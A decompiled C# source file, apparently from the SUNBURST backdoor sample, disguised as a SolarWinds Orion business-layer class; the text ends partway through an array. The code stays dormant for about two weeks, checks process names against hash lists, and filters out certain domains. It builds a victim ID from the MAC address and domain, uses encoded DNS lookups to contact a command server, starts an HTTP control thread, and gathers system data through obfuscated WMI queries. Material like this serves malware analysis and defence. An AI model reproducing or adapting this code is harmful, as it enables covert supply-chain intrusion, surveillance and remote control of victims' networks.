// Decompiled with JetBrains decompiler
// Type: SolarWinds.Orion.Core.BusinessLayer.OrionImprovementBusinessLayer
// Assembly: SolarWinds.Orion.Core.BusinessLayer, Version=2020.2.5300.12432, Culture=neutral, PublicKeyToken=null
// MVID: 8A00C947-7FE8-4638-AFC6-F6694E5CE56E
// Assembly location: Z:\samples\new\4572807326629888\sunburst.dll

using Microsoft.Win32;
using SolarWinds.Orion.Core.Common.Configuration;
using SolarWinds.Orion.Core.SharedCredentials.Credentials;
using System;
using System.Collections.Generic;
using System.Configuration;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.IO.Pipes;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Security;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace SolarWinds.Orion.Core.BusinessLayer
{
  internal class OrionImprovementBusinessLayer
  {
    private static volatile bool _isAlive = false;
    private static readonly object _isAliveLock = new object();
    private static readonly ulong[] assemblyTimeStamps = new ulong[137]
    {
      2597124982561782591UL,
      2600364143812063535UL,
      13464308873961738403UL,
      4821863173800309721UL,
      12969190449276002545UL,
      3320026265773918739UL,
      12094027092655598256UL,
      10657751674541025650UL,
      11913842725949116895UL,
      5449730069165757263UL,
      292198192373389586UL,
      12790084614253405985UL,
      5219431737322569038UL,
      15535773470978271326UL,
      7810436520414958497UL,
      13316211011159594063UL,
      13825071784440082496UL,
      14480775929210717493UL,
      14482658293117931546UL,
      8473756179280619170UL,
      3778500091710709090UL,
      8799118153397725683UL,
      12027963942392743532UL,
      576626207276463000UL,
      7412338704062093516UL,
      682250828679635420UL,
      13014156621614176974UL,
      18150909006539876521UL,
      10336842116636872171UL,
      12785322942775634499UL,
      13260224381505715848UL,
      17956969551821596225UL,
      8709004393777297355UL,
      14256853800858727521UL,
      8129411991672431889UL,
      15997665423159927228UL,
      10829648878147112121UL,
      9149947745824492274UL,
      3656637464651387014UL,
      3575761800716667678UL,
      4501656691368064027UL,
      10296494671777307979UL,
      14630721578341374856UL,
      4088976323439621041UL,
      9531326785919727076UL,
      6461429591783621719UL,
      6508141243778577344UL,
      10235971842993272939UL,
      2478231962306073784UL,
      9903758755917170407UL,
      14710585101020280896UL,
      14710585101020280896UL,
      13611814135072561278UL,
      2810460305047003196UL,
      2032008861530788751UL,
      27407921587843457UL,
      6491986958834001955UL,
      2128122064571842954UL,
      10484659978517092504UL,
      8478833628889826985UL,
      10463926208560207521UL,
      7080175711202577138UL,
      8697424601205169055UL,
      7775177810774851294UL,
      16130138450758310172UL,
      506634811745884560UL,
      18294908219222222902UL,
      3588624367609827560UL,
      9555688264681862794UL,
      5415426428750045503UL,
      3642525650883269872UL,
      13135068273077306806UL,
      3769837838875367802UL,
      191060519014405309UL,
      1682585410644922036UL,
      7878537243757499832UL,
      13799353263187722717UL,
      1367627386496056834UL,
      12574535824074203265UL,
      16990567851129491937UL,
      8994091295115840290UL,
      13876356431472225791UL,
      14968320160131875803UL,
      14868920869169964081UL,
      106672141413120087UL,
      79089792725215063UL,
      5614586596107908838UL,
      3869935012404164040UL,
      3538022140597504361UL,
      14111374107076822891UL,
      7982848972385914508UL,
      8760312338504300643UL,
      17351543633914244545UL,
      7516148236133302073UL,
      15114163911481793350UL,
      15457732070353984570UL,
      16292685861617888592UL,
      10374841591685794123UL,
      3045986759481489935UL,
      17109238199226571972UL,
      6827032273910657891UL,
      5945487981219695001UL,
      8052533790968282297UL,
      17574002783607647274UL,
      3341747963119755850UL,
      14193859431895170587UL,
      17439059603042731363UL,
      17683972236092287897UL,
      700598796416086955UL,
      3660705254426876796UL,
      12709986806548166638UL,
      3890794756780010537UL,
      2797129108883749491UL,
      3890769468012566366UL,
      14095938998438966337UL,
      11109294216876344399UL,
      1368907909245890092UL,
      11818825521849580123UL,
      8146185202538899243UL,
      2934149816356927366UL,
      13029357933491444455UL,
      6195833633417633900UL,
      2760663353550280147UL,
      16423314183614230717UL,
      2532538262737333146UL,
      4454255944391929578UL,
      6088115528707848728UL,
      13611051401579634621UL,
      18147627057830191163UL,
      17633734304611248415UL,
      13581776705111912829UL,
      7175363135479931834UL,
      3178468437029279937UL,
      13599785766252827703UL,
      6180361713414290679UL,
      8612208440357175863UL,
      8408095252303317471UL
    };
    private static readonly ulong[] configTimeStamps = new ulong[17]
    {
      17097380490166623672UL,
      15194901817027173566UL,
      12718416789200275332UL,
      18392881921099771407UL,
      3626142665768487764UL,
      12343334044036541897UL,
      397780960855462669UL,
      6943102301517884811UL,
      13544031715334011032UL,
      11801746708619571308UL,
      18159703063075866524UL,
      835151375515278827UL,
      16570804352575357627UL,
      1614465773938842903UL,
      12679195163651834776UL,
      2717025511528702475UL,
      17984632978012874803UL
    };
    private static readonly object svcListModifiedLock = new object();
    private static volatile bool _svcListModified1 = false;
    private static volatile bool _svcListModified2 = false;
    private static readonly OrionImprovementBusinessLayer.ServiceConfiguration[] svcList;
    private static readonly OrionImprovementBusinessLayer.IPAddressesHelper[] nList;
    private static readonly ulong[] patternHashes;
    private static readonly string[] patternList;
    private static readonly string reportStatusName;
    private static readonly string serviceStatusName;
    private static string userAgentOrionImprovementClient;
    private static string userAgentDefault;
    private static readonly string apiHost;
    private static readonly string domain1;
    private static readonly string domain2;
    private static readonly string[] domain3;
    private static readonly string appId;
    private static OrionImprovementBusinessLayer.ReportStatus status;
    private static string domain4;
    private static byte[] userId;
    private static NamedPipeServerStream instance;
    private const int minInterval = 30;
    private const int maxInterval = 120;
    private static string osVersion;
    private static string osInfo;

    public static bool IsAlive
    {
      get
      {
        lock (OrionImprovementBusinessLayer._isAliveLock)
        {
          if (OrionImprovementBusinessLayer._isAlive)
            return true;
          OrionImprovementBusinessLayer._isAlive = true;
          return false;
        }
      }
    }

    private static bool svcListModified1
    {
      get
      {
        lock (OrionImprovementBusinessLayer.svcListModifiedLock)
        {
          int num = OrionImprovementBusinessLayer._svcListModified1 ? 1 : 0;
          OrionImprovementBusinessLayer._svcListModified1 = false;
          return num != 0;
        }
      }
      set
      {
        lock (OrionImprovementBusinessLayer.svcListModifiedLock)
          OrionImprovementBusinessLayer._svcListModified1 = value;
      }
    }

    private static bool svcListModified2
    {
      get
      {
        lock (OrionImprovementBusinessLayer.svcListModifiedLock)
          return OrionImprovementBusinessLayer._svcListModified2;
      }
      set
      {
        lock (OrionImprovementBusinessLayer.svcListModifiedLock)
          OrionImprovementBusinessLayer._svcListModified2 = value;
      }
    }

    public static void Initialize()
    {
      try
      {
        if (OrionImprovementBusinessLayer.GetHash(Process.GetCurrentProcess().ProcessName.ToLower()) != 17291806236368054941UL || DateTime.Now.CompareTo(System.IO.File.GetLastWriteTime(Assembly.GetExecutingAssembly().Location).AddHours((double) new Random().Next(288, 336))) < 0)
          return;
        OrionImprovementBusinessLayer.instance = new NamedPipeServerStream(OrionImprovementBusinessLayer.appId);
        OrionImprovementBusinessLayer.ConfigManager.ReadReportStatus(out OrionImprovementBusinessLayer.status);
        if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.Truncate)
          return;
        OrionImprovementBusinessLayer.DelayMin(0, 0);
        OrionImprovementBusinessLayer.domain4 = IPGlobalProperties.GetIPGlobalProperties().DomainName;
        if (string.IsNullOrEmpty(OrionImprovementBusinessLayer.domain4) || OrionImprovementBusinessLayer.IsNullOrInvalidName(OrionImprovementBusinessLayer.domain4))
          return;
        OrionImprovementBusinessLayer.DelayMin(0, 0);
        if (!OrionImprovementBusinessLayer.GetOrCreateUserID(out OrionImprovementBusinessLayer.userId))
          return;
        OrionImprovementBusinessLayer.DelayMin(0, 0);
        OrionImprovementBusinessLayer.ConfigManager.ReadServiceStatus(false);
        OrionImprovementBusinessLayer.Update();
        OrionImprovementBusinessLayer.instance.Close();
      }
      catch (Exception ex)
      {
      }
    }

    private static bool UpdateNotification()
    {
      int num = 3;
      while (num-- > 0)
      {
        OrionImprovementBusinessLayer.DelayMin(0, 0);
        if (OrionImprovementBusinessLayer.ProcessTracker.TrackProcesses(true))
          return false;
        if (OrionImprovementBusinessLayer.DnsHelper.CheckServerConnection(OrionImprovementBusinessLayer.apiHost))
          return true;
      }
      return false;
    }

    private static void Update()
    {
      bool flag1 = false;
      OrionImprovementBusinessLayer.CryptoHelper cryptoHelper = new OrionImprovementBusinessLayer.CryptoHelper(OrionImprovementBusinessLayer.userId, OrionImprovementBusinessLayer.domain4);
      OrionImprovementBusinessLayer.HttpHelper http = (OrionImprovementBusinessLayer.HttpHelper) null;
      Thread thread = (Thread) null;
      bool last = true;
      OrionImprovementBusinessLayer.AddressFamilyEx addressFamilyEx = OrionImprovementBusinessLayer.AddressFamilyEx.Unknown;
      int num1 = 0;
      bool flag2 = true;
      OrionImprovementBusinessLayer.DnsRecords rec = new OrionImprovementBusinessLayer.DnsRecords();
      Random random = new Random();
      int num2 = 0;
      if (!OrionImprovementBusinessLayer.UpdateNotification())
        return;
      OrionImprovementBusinessLayer.svcListModified2 = false;
      for (int index = 1; index <= 3 && !flag1; ++index)
      {
        OrionImprovementBusinessLayer.DelayMin(rec.A, rec.A);
        if (!OrionImprovementBusinessLayer.ProcessTracker.TrackProcesses(true))
        {
          if (OrionImprovementBusinessLayer.svcListModified1)
            flag2 = true;
          num1 = OrionImprovementBusinessLayer.svcListModified2 ? num1 + 1 : 0;
          string hostName;
          switch (OrionImprovementBusinessLayer.status)
          {
            case OrionImprovementBusinessLayer.ReportStatus.New:
              hostName = addressFamilyEx == OrionImprovementBusinessLayer.AddressFamilyEx.Error ? cryptoHelper.GetCurrentString() : cryptoHelper.GetPreviousString(out last);
              break;
            case OrionImprovementBusinessLayer.ReportStatus.Append:
              hostName = flag2 ? cryptoHelper.GetNextStringEx(rec.dnssec) : cryptoHelper.GetNextString(rec.dnssec);
              break;
            default:
              goto label_27;
          }
          addressFamilyEx = OrionImprovementBusinessLayer.DnsHelper.GetAddressFamily(hostName, rec);
          switch (addressFamilyEx)
          {
            case OrionImprovementBusinessLayer.AddressFamilyEx.NetBios:
              if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.Append)
              {
                flag2 = false;
                if (rec.dnssec)
                {
                  num2 = rec.A;
                  rec.A = random.Next(1, 3);
                }
              }
              if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.New & last)
              {
                OrionImprovementBusinessLayer.status = OrionImprovementBusinessLayer.ReportStatus.Append;
                OrionImprovementBusinessLayer.ConfigManager.WriteReportStatus(OrionImprovementBusinessLayer.status);
              }
              if (!string.IsNullOrEmpty(rec.cname))
              {
                rec.A = num2;
                OrionImprovementBusinessLayer.HttpHelper.Close(http, thread);
                http = new OrionImprovementBusinessLayer.HttpHelper(OrionImprovementBusinessLayer.userId, rec);
                if (!OrionImprovementBusinessLayer.svcListModified2 || num1 > 1)
                {
                  OrionImprovementBusinessLayer.svcListModified2 = false;
                  thread = new Thread(new ThreadStart(http.Initialize))
                  {
                    IsBackground = true
                  };
                  thread.Start();
                }
              }
              index = 0;
              break;
            case OrionImprovementBusinessLayer.AddressFamilyEx.ImpLink:
            case OrionImprovementBusinessLayer.AddressFamilyEx.Atm:
              OrionImprovementBusinessLayer.ConfigManager.WriteReportStatus(OrionImprovementBusinessLayer.ReportStatus.Truncate);
              OrionImprovementBusinessLayer.ProcessTracker.SetAutomaticMode();
              flag1 = true;
              break;
            case OrionImprovementBusinessLayer.AddressFamilyEx.Ipx:
              if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.Append)
                OrionImprovementBusinessLayer.ConfigManager.WriteReportStatus(OrionImprovementBusinessLayer.ReportStatus.New);
              flag1 = true;
              break;
            case OrionImprovementBusinessLayer.AddressFamilyEx.Error:
              rec.A = random.Next(420, 540);
              break;
            default:
              flag1 = true;
              break;
          }
        }
        else
          break;
      }
label_27:
      OrionImprovementBusinessLayer.HttpHelper.Close(http, thread);
    }

    private static string GetManagementObjectProperty(ManagementObject obj, string property)
    {
      string str = !(obj.Properties[property].Value?.GetType() == typeof (string[])) ? obj.Properties[property].Value?.ToString() ?? "" : string.Join(", ", ((IEnumerable<string>) (string[]) obj.Properties[property].Value).Select<string, string>((Func<string, string>) (v => v.ToString())));
      return property + ": " + str + "\n";
    }

    private static string GetNetworkAdapterConfiguration()
    {
      string str = "";
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(OrionImprovementBusinessLayer.ZipHelper.Unzip("C07NSU0uUdBScCvKz1UIz8wzNor3Sy0pzy/KdkxJLChJLXLOz0vLTC8tSizJzM9TKM9ILUpV8AxwzUtMyklNsS0pKk0FAA==")))
        {
          foreach (ManagementObject managementObject in managementObjectSearcher.Get().Cast<ManagementObject>())
          {
            str += "\n";
            str += OrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject, OrionImprovementBusinessLayer.ZipHelper.Unzip("c0ktTi7KLCjJzM8DAA=="));
            str += OrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject, OrionImprovementBusinessLayer.ZipHelper.Unzip("83V0dkxJKUotLgYA"));
            str += OrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject, OrionImprovementBusinessLayer.ZipHelper.Unzip("c/FwDnDNS0zKSU0BAA=="));
            str += OrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject, OrionImprovementBusinessLayer.ZipHelper.Unzip("c/FwDghOLSpLLQIA"));
            str += OrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject, OrionImprovementBusinessLayer.ZipHelper.Unzip("c/EL9sgvLvFLzE0FAA=="));
            str += OrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject, OrionImprovementBusinessLayer.ZipHelper.Unzip("c/ELdsnPTczMCy5NS8usCE5NLErO8C9KSS0CAA=="));
            str += OrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject, OrionImprovementBusinessLayer.ZipHelper.Unzip("c/ELDk4tKkstCk5NLErO8C9KSS0CAA=="));
            str += OrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject, OrionImprovementBusinessLayer.ZipHelper.Unzip("8wxwTEkpSi0uBgA="));
            str += OrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject, OrionImprovementBusinessLayer.ZipHelper.Unzip("8wwILk3KSy0BAA=="));
            str += OrionImprovementBusinessLayer.GetManagementObjectProperty(managementObject, OrionImprovementBusinessLayer.ZipHelper.Unzip("c0lNSyzNKfEMcE8sSS1PrAQA"));
          }
          return str;
        }
      }
      catch (Exception ex)
      {
        return str + ex.Message;
      }
    }

    private static string GetOSVersion(bool full)
    {
      if (OrionImprovementBusinessLayer.osVersion == null || OrionImprovementBusinessLayer.osInfo == null)
      {
        try
        {
          using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(OrionImprovementBusinessLayer.ZipHelper.Unzip("C07NSU0uUdBScCvKz1UIz8wzNor3L0gtSizJzEsPriwuSc0FAA==")))
          {
            ManagementObject managementObject = managementObjectSearcher.Get().Cast<ManagementObject>().FirstOrDefault<ManagementObject>();
            OrionImprovementBusinessLayer.osInfo = managementObject.Properties[OrionImprovementBusinessLayer.ZipHelper.Unzip("c04sKMnMzwMA")].Value.ToString();
            OrionImprovementBusinessLayer.osInfo = OrionImprovementBusinessLayer.osInfo + ";" + managementObject.Properties[OrionImprovementBusinessLayer.ZipHelper.Unzip("8w92LErOyCxJTS4pLUoFAA==")].Value.ToString();
            OrionImprovementBusinessLayer.osInfo = OrionImprovementBusinessLayer.osInfo + ";" + managementObject.Properties[OrionImprovementBusinessLayer.ZipHelper.Unzip("88wrLknMyXFJLEkFAA==")].Value.ToString();
            OrionImprovementBusinessLayer.osInfo = OrionImprovementBusinessLayer.osInfo + ";" + managementObject.Properties[OrionImprovementBusinessLayer.ZipHelper.Unzip("8y9KT8zLrEosyczPAwA=")].Value.ToString();
            OrionImprovementBusinessLayer.osInfo = OrionImprovementBusinessLayer.osInfo + ";" + managementObject.Properties[OrionImprovementBusinessLayer.ZipHelper.Unzip("C0pNzywuSS1KTQktTi0CAA==")].Value.ToString();
            string str = managementObject.Properties[OrionImprovementBusinessLayer.ZipHelper.Unzip("C0stKs7MzwMA")].Value.ToString();
            OrionImprovementBusinessLayer.osInfo = OrionImprovementBusinessLayer.osInfo + ";" + str;
            string[] strArray = str.Split('.');
            OrionImprovementBusinessLayer.osVersion = strArray[0] + "." + strArray[1];
          }
        }
        catch (Exception ex)
        {
          OrionImprovementBusinessLayer.osVersion = Environment.OSVersion.Version.Major.ToString() + "." + (object) Environment.OSVersion.Version.Minor;
          OrionImprovementBusinessLayer.osInfo = string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("i3aNVag2qFWoNgRio1oA"), (object) Environment.OSVersion.VersionString, (object) Environment.OSVersion.Version, (object) (Environment.Is64BitOperatingSystem ? 64 : 32));
        }
      }
      return !full ? OrionImprovementBusinessLayer.osVersion : OrionImprovementBusinessLayer.osInfo;
    }

    private static string ReadDeviceInfo()
    {
      try
      {
        return ((IEnumerable<NetworkInterface>) NetworkInterface.GetAllNetworkInterfaces()).Where<NetworkInterface>((Func<NetworkInterface, bool>) (nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)).Select<NetworkInterface, string>((Func<NetworkInterface, string>) (nic => nic.GetPhysicalAddress().ToString())).FirstOrDefault<string>();
      }
      catch (Exception ex)
      {
      }
      return (string) null;
    }

    private static bool GetOrCreateUserID(out byte[] hash64)
    {
      string str = OrionImprovementBusinessLayer.ReadDeviceInfo();
      hash64 = new byte[8];
      Array.Clear((Array) hash64, 0, hash64.Length);
      if (str == null)
        return false;
      string s = str + OrionImprovementBusinessLayer.domain4;
      try
      {
        s += OrionImprovementBusinessLayer.RegistryHelper.GetValue(OrionImprovementBusinessLayer.ZipHelper.Unzip("8/B2jYz38Xd29In3dXT28PRzjQn2dwsJdwxyjfHNTC7KL85PK4lxLqosKMlPL0osyKgEAA=="), OrionImprovementBusinessLayer.ZipHelper.Unzip("801MzsjMS3UvzUwBAA=="), (object) "");
      }
      catch
      {
      }
      using (MD5 md5 = MD5.Create())
      {
        byte[] bytes = Encoding.ASCII.GetBytes(s);
        byte[] hash = md5.ComputeHash(bytes);
        if (hash.Length < hash64.Length)
          return false;
        for (int index = 0; index < hash.Length; ++index)
          hash64[index % hash64.Length] ^= hash[index];
      }
      return true;
    }

    private static bool IsNullOrInvalidName(string domain4)
    {
      string[] strArray = domain4.ToLower().Split('.');
      if (strArray.Length >= 2)
      {
        string s = strArray[strArray.Length - 2] + "." + strArray[strArray.Length - 1];
        foreach (ulong patternHash in OrionImprovementBusinessLayer.patternHashes)
        {
          if ((long) OrionImprovementBusinessLayer.GetHash(s) == (long) patternHash)
            return true;
        }
      }
      foreach (string pattern in OrionImprovementBusinessLayer.patternList)
      {
        if (Regex.Match(domain4, pattern).Success)
          return true;
      }
      return false;
    }

    private static void DelayMs(double minMs, double maxMs)
    {
      if ((int) maxMs == 0)
      {
        minMs = 1000.0;
        maxMs = 2000.0;
      }
      double num;
      for (num = minMs + new Random().NextDouble() * (maxMs - minMs); num >= (double) int.MaxValue; num -= (double) int.MaxValue)
        Thread.Sleep(int.MaxValue);
      Thread.Sleep((int) num);
    }

    private static void DelayMin(int minMinutes, int maxMinutes)
    {
      if (maxMinutes == 0)
      {
        minMinutes = 30;
        maxMinutes = 120;
      }
      OrionImprovementBusinessLayer.DelayMs((double) minMinutes * 60.0 * 1000.0, (double) maxMinutes * 60.0 * 1000.0);
    }

    private static ulong GetHash(string s)
    {
      ulong num1 = 14695981039346656037;
      try
      {
        foreach (byte num2 in Encoding.UTF8.GetBytes(s))
        {
          num1 ^= (ulong) num2;
          num1 *= 1099511628211UL;
        }
      }
      catch
      {
      }
      return num1 ^ 6605813339339102567UL;
    }

    private static string Quote(string s)
    {
      return s == null || !s.Contains(" ") || s.Contains("\"") ? s : "\"" + s + "\"";
    }

    private static string Unquote(string s)
    {
      return s.StartsWith('"'.ToString()) && s.EndsWith('"'.ToString()) ? s.Substring(1, s.Length - 2) : s;
    }

    private static string ByteArrayToHexString(byte[] bytes)
    {
      StringBuilder stringBuilder = new StringBuilder(bytes.Length * 2);
      foreach (byte num in bytes)
        stringBuilder.AppendFormat("{0:x2}", (object) num);
      return stringBuilder.ToString();
    }

    private static byte[] HexStringToByteArray(string hex)
    {
      byte[] numArray = new byte[hex.Length / 2];
      for (int startIndex = 0; startIndex < hex.Length; startIndex += 2)
        numArray[startIndex / 2] = Convert.ToByte(hex.Substring(startIndex, 2), 16);
      return numArray;
    }

    static OrionImprovementBusinessLayer()
    {
      OrionImprovementBusinessLayer.ServiceConfiguration[] serviceConfigurationArray = new OrionImprovementBusinessLayer.ServiceConfiguration[8];
      OrionImprovementBusinessLayer.ServiceConfiguration serviceConfiguration1 = new OrionImprovementBusinessLayer.ServiceConfiguration();
      serviceConfiguration1.timeStamps = new ulong[1]
      {
        5183687599225757871UL
      };
      serviceConfiguration1.Svc = new OrionImprovementBusinessLayer.ServiceConfiguration.Service[1]
      {
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 917638920165491138UL,
          started = true
        }
      };
      serviceConfigurationArray[0] = serviceConfiguration1;
      OrionImprovementBusinessLayer.ServiceConfiguration serviceConfiguration2 = new OrionImprovementBusinessLayer.ServiceConfiguration();
      serviceConfiguration2.timeStamps = new ulong[1]
      {
        10063651499895178962UL
      };
      serviceConfiguration2.Svc = new OrionImprovementBusinessLayer.ServiceConfiguration.Service[1]
      {
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 16335643316870329598UL,
          started = true
        }
      };
      serviceConfigurationArray[1] = serviceConfiguration2;
      serviceConfigurationArray[2] = new OrionImprovementBusinessLayer.ServiceConfiguration()
      {
        timeStamps = new ulong[2]
        {
          10501212300031893463UL,
          155978580751494388UL
        },
        Svc = new OrionImprovementBusinessLayer.ServiceConfiguration.Service[0]
      };
      OrionImprovementBusinessLayer.ServiceConfiguration serviceConfiguration3 = new OrionImprovementBusinessLayer.ServiceConfiguration();
      serviceConfiguration3.timeStamps = new ulong[2]
      {
        17204844226884380288UL,
        5984963105389676759UL
      };
      serviceConfiguration3.Svc = new OrionImprovementBusinessLayer.ServiceConfiguration.Service[4]
      {
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 11385275378891906608UL,
          DefaultValue = 2U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 13693525876560827283UL,
          DefaultValue = 1U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 17849680105131524334UL,
          DefaultValue = 1U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 18246404330670877335UL,
          DefaultValue = 3U
        }
      };
      serviceConfigurationArray[3] = serviceConfiguration3;
      OrionImprovementBusinessLayer.ServiceConfiguration serviceConfiguration4 = new OrionImprovementBusinessLayer.ServiceConfiguration();
      serviceConfiguration4.timeStamps = new ulong[2]
      {
        8698326794961817906UL,
        9061219083560670602UL
      };
      serviceConfiguration4.Svc = new OrionImprovementBusinessLayer.ServiceConfiguration.Service[3]
      {
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 11771945869106552231UL,
          DefaultValue = 1U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 9234894663364701749UL,
          DefaultValue = 3U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 8698326794961817906UL,
          DefaultValue = 2U
        }
      };
      serviceConfigurationArray[4] = serviceConfiguration4;
      OrionImprovementBusinessLayer.ServiceConfiguration serviceConfiguration5 = new OrionImprovementBusinessLayer.ServiceConfiguration();
      serviceConfiguration5.timeStamps = new ulong[2]
      {
        15695338751700748390UL,
        640589622539783622UL
      };
      serviceConfiguration5.Svc = new OrionImprovementBusinessLayer.ServiceConfiguration.Service[5]
      {
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 15695338751700748390UL,
          DefaultValue = 2U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 9384605490088500348UL,
          DefaultValue = 3U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 6274014997237900919UL,
          DefaultValue = 3U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 15092207615430402812UL,
          DefaultValue = 0U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 3320767229281015341UL,
          DefaultValue = 3U
        }
      };
      serviceConfigurationArray[5] = serviceConfiguration5;
      OrionImprovementBusinessLayer.ServiceConfiguration serviceConfiguration6 = new OrionImprovementBusinessLayer.ServiceConfiguration();
      serviceConfiguration6.timeStamps = new ulong[3]
      {
        3200333496547938354UL,
        14513577387099045298UL,
        607197993339007484UL
      };
      serviceConfiguration6.Svc = new OrionImprovementBusinessLayer.ServiceConfiguration.Service[8]
      {
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 15587050164583443069UL,
          DefaultValue = 1U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 9559632696372799208UL,
          DefaultValue = 0U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 4931721628717906635UL,
          DefaultValue = 1U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 3200333496547938354UL,
          DefaultValue = 2U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 2589926981877829912UL,
          DefaultValue = 3U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 17997967489723066537UL,
          DefaultValue = 1U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 14079676299181301772UL,
          DefaultValue = 2U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 17939405613729073960UL,
          DefaultValue = 1U
        }
      };
      serviceConfigurationArray[6] = serviceConfiguration6;
      OrionImprovementBusinessLayer.ServiceConfiguration serviceConfiguration7 = new OrionImprovementBusinessLayer.ServiceConfiguration();
      serviceConfiguration7.timeStamps = new ulong[9]
      {
        521157249538507889UL,
        14971809093655817917UL,
        10545868833523019926UL,
        15039834196857999838UL,
        14055243717250701608UL,
        5587557070429522647UL,
        12445177985737237804UL,
        17978774977754553159UL,
        17017923349298346219UL
      };
      serviceConfiguration7.Svc = new OrionImprovementBusinessLayer.ServiceConfiguration.Service[19]
      {
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 17624147599670377042UL,
          DefaultValue = 2U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 16066651430762394116UL,
          DefaultValue = 3U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 13655261125244647696UL,
          DefaultValue = 2U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 12445177985737237804UL,
          DefaultValue = 3U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 3421213182954201407UL,
          DefaultValue = 2U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 14243671177281069512UL,
          DefaultValue = 3U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 16112751343173365533UL,
          DefaultValue = 3U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 3425260965299690882UL,
          DefaultValue = 1U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 9333057603143916814UL,
          DefaultValue = 0U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 3413886037471417852UL,
          DefaultValue = 3U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 7315838824213522000UL,
          DefaultValue = 1U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 13783346438774742614UL,
          DefaultValue = 4U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 2380224015317016190UL,
          DefaultValue = 4U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 3413052607651207697UL,
          DefaultValue = 1U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 3407972863931386250UL,
          DefaultValue = 1U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 10393903804869831898UL,
          DefaultValue = 3U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 12445232961318634374UL,
          DefaultValue = 2U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 3421197789791424393UL,
          DefaultValue = 2U
        },
        new OrionImprovementBusinessLayer.ServiceConfiguration.Service()
        {
          timeStamp = 541172992193764396UL,
          DefaultValue = 2U
        }
      };
      serviceConfigurationArray[7] = serviceConfiguration7;
      OrionImprovementBusinessLayer.svcList = serviceConfigurationArray;
      OrionImprovementBusinessLayer.nList = new OrionImprovementBusinessLayer.IPAddressesHelper[22]
      {
